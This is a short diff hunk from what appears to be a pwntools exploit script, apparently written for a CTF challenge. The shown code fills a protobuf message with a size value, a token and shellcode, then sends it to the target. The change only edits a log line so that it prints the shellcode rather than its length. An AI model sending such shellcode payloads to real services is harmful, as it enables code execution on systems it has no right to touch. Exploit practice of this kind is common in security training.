@@ -152,7 +152,7 @@ def payload(lo: int):
     message.giaosize = 0x415411
     message.giaotoken = b'87dd78e1-9025-4d57-9c2e-418608b3bbea'
     message.giaocontent = shellcode
-    success(f'Sending shellcode len({shellcode}) = {len(shellcode):#x}')
+    success(f'Sending shellcode {shellcode}')
     t.sendafter(b'your giao', message.SerializeToString())
 
     t.clean()
